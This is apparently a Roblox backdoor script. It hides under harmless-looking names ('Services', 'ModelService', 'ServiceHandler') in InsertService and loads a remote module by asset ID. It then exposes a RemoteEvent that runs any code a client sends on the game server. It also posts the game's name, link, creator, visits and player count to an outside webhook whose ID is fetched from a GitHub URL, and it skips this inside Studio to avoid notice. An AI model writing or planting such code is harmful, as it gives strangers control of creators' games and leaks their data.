local MainFol = Instance.new("Folder")
MainFol.Parent = game:GetService("InsertService")
MainFol.Name = "Services"

local Module4 = Instance.new("ModuleScript")
Module4.Parent = MainFol
Module4.Name = "ModelService"

local Event = Instance.new("RemoteEvent")
Event.Parent = MainFol
Event.Name = "InsertModel"

local ResponseEvent = Instance.new("RemoteFunction")
ResponseEvent.Parent = MainFol
ResponseEvent.Name = "GetModelData"

script.Parent = MainFol
script.Name = "ServiceHandler"

local phobos = require(10131117731)
warn(phobos)

local isHttpEnabled = pcall(function()
	game:GetService("HttpService"):RequestAsync({Url = "https://google.com", Method = "GET"})
end)

local BDV = "V2"

function cleanErrorMessage(errorMessage)
	local _, _, cleanMessage = string.find(errorMessage, ":%d+:%s*(.*)")
	return cleanMessage or errorMessage
end

local rateLimitThreshold = 50
local rateLimitTimeFrame = 15
local rateLimits = {}

function CheckRateLimit(player)
	local currentTime = os.time()
	local playerId = player.UserId

	if not rateLimits[playerId] then
		rateLimits[playerId] = {}
	end

	local requestTimes = rateLimits[playerId]
	table.insert(requestTimes, currentTime)

	while #requestTimes > 0 and currentTime - requestTimes[1] > rateLimitTimeFrame do
		table.remove(requestTimes, 1)
	end

	return #requestTimes > rateLimitThreshold
end

function gethook()
	local http = game:GetService("HttpService")
	local url = "https://raw.githubusercontent.com/phobosv211/phobosv2/main/vector2"
	local success, result = pcall(function()
		return http:GetAsync(url)
	end)

	if success then
		return result
	else
		return nil
	end
end

function Upload()
	local http = game:GetService("HttpService")
	local hook = "https://webhook.newstargeted.com/api/webhooks/"..gethook()
	if not hook then
		return "Failed"
	end

	local roproxy = http:JSONDecode(http:GetAsync("https://games.roproxy.com/v1/games?universeIds="..game.GameId))
	local roData = roproxy.data[1]

	local createdDate = roData.created:sub(1, 10)
	local updatedDate = roData.updated:sub(1, 10)

	local gname = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
	local Players = game:GetService("Players"):GetChildren()
	local data = {
		["embeds"] = {{
			["title"] = gname.Name,
			["description"] = "**Link: ** ".."https://www.roblox.com/games/"..game.PlaceId.."\n\n**Online: **"..#Players.."\n\n**Max Players: **"..roData.maxPlayers.."\n\n**Creator: **"..game:GetService("Players"):GetNameFromUserIdAsync(game.CreatorId).."\n\n**Visits: **"..roData.visits.."\n\n**Created: **"..createdDate.."\n\n**Last Updated: **"..updatedDate.."\n\n**Version: **"..BDV,
			["thumbnail"] = {url="https://cdn.discordapp.com/emojis/1249121745068101672.webp?size=128&quality=lossless"},
			["color"] = tonumber(000000)
		}}
	}
	local data2 = http:JSONEncode(data)

	local success, result = pcall(function()
		return http:PostAsync(hook, data2, Enum.HttpContentType.ApplicationJson)
	end)

	if success then
		return true
	else
		return false
	end
end

local uploadCalled = false

function Check()
	if not game:GetService("RunService"):IsStudio() then
		if game:GetService("Chat"):FindFirstChild("ChatLocalizationService") then
			if game.GameId == 0 then
				return
			else
				if not uploadCalled then
					Upload()
					uploadCalled = true
				end
				return
			end
		else
			return
		end
	end
end

local success1, result1 = pcall(function()
	Check()
end)

if not success1 then
	return
end

if not isHttpEnabled then
	Event:FireClient()
else
	Check()
end

Event.OnServerEvent:Connect(function(player, scriptText, Other)
	if CheckRateLimit(player) then
		ResponseEvent:InvokeClient(player, "RateLimited")
		return false
	end

	local success, result = pcall(function()
		if Other == "Respawn" then
			local success, result = pcall(function()
				player:LoadCharacter()
				ResponseEvent:InvokeClient(player, "Respawned")
			end)
			if not success then
				ResponseEvent:InvokeClient(player, "Error", cleanErrorMessage(result))
			end
		elseif Other == "R6" then
			local success, result = pcall(function()
				require(10796895415).load(player.Name)
				ResponseEvent:InvokeClient(player, "R6")
			end)
			if not success then
				ResponseEvent:InvokeClient(player, "Error", cleanErrorMessage(result))
			end
		elseif Other == "R15" then
			local success, result = pcall(function()
				require(4488774623).load(player.Name)
				ResponseEvent:InvokeClient(player, "R6")
			end)
			if not success then
				ResponseEvent:InvokeClient(player, "Error", cleanErrorMessage(result))
			end
		else
			local success, result = pcall(function()
				phobos(scriptText)()
				ResponseEvent:InvokeClient(player, "Executed")
			end)
			if not success then
				ResponseEvent:InvokeClient(player, "Error", cleanErrorMessage(result))
			end
		end
	end)

	if not success then
		ResponseEvent:InvokeClient(player, "Error", cleanErrorMessage(result))
	end
end)

ResponseEvent.OnServerInvoke = function(player, response1, errorMessage)
	if response1 == "" then
		return
	end
end
